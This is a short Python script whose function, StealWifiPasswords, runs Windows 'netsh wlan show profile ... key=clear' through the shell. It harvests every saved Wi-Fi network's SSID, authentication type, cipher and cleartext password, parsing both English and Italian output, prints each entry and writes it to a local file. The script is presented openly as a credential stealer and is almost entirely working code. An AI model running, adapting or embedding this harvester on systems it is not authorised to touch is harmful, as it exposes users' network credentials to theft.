
# Import modules
import re 
import subprocess


""" Get wifi auth credentials """
def StealWifiPasswords():
    try:
        result = []
        chcp = f"chcp 65001 && "
        # Fetch all networks
        networks = subprocess.check_output(f"{chcp} netsh wlan show profile", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        networks = networks.decode(encoding="utf8", errors="strict")
        network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
        if network_names_list == []:
            network_names_list = re.findall("(?: Tutti i profili utente\s*:\s)(.*)", networks)
        
        print(network_names_list)
        # For all found networks
        for network_name in network_names_list:
            current_result = subprocess.check_output(f"{chcp}netsh wlan show profile {network_name} key=clear", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            current_result = current_result.decode(encoding="utf8", errors="strict")      
            # Fetch wifi credentials
            
            try:
            	ssid = re.findall("(?:Nome SSID\s*:\s)(.*)", str(current_result))[0].replace("\r", '').replace("\"", '')
                
            except IndexError:
            	ssid = re.findall("(?:SSID Name\s*:\s)(.*)", str(current_result))[0].replace("\r", '').replace("\"", '')
           
            try:
                authentication = re.findall(r"(?:Authentication\s*:\s)(.*)", current_result)[0].replace("\r", '')
            
            except IndexError:
            	authentication = re.findall(r"(?:Autenticazione\s*:\s)(.*)", current_result)[0].replace("\r", '')
           
            try:
                cipher = re.findall("(?:Cipher\s*:\s)(.*)", current_result)[0].replace("\r", '')
            except IndexError:
            	cipher = re.findall("(?:Crittografia\s*:\s)(.*)", current_result)[0].replace("\r", '')
           
            try:
                security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)[0].replace("\r", '')
            
            except IndexError:
            	security_key = re.findall(r"(?:Chiave di sicurezza\s*:\s)(.*)", current_result)[0].replace("\r", '')
           
            try:
                password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)[0].replace("\r", '')
            except IndexError:
                password = re.findall("(?:Contenuto chiave\s*:\s)(.*)", current_result)[0].replace("\r", '')
            # Save
            wifi = {
                "SSID": ssid,
                "AUTH": authentication,
                "CIPHER": cipher,
                "SECURITY_KEY": security_key,
                "PASSWORD": password
            }
            result.append(wifi)
            print(wifi)
        
            with open("output_file_wifi.txt", "w") as file:
                file.write(str(wifi))
                file.write("\n")

        return result
    except subprocess.CalledProcessError as e:
        pass


StealWifiPasswords()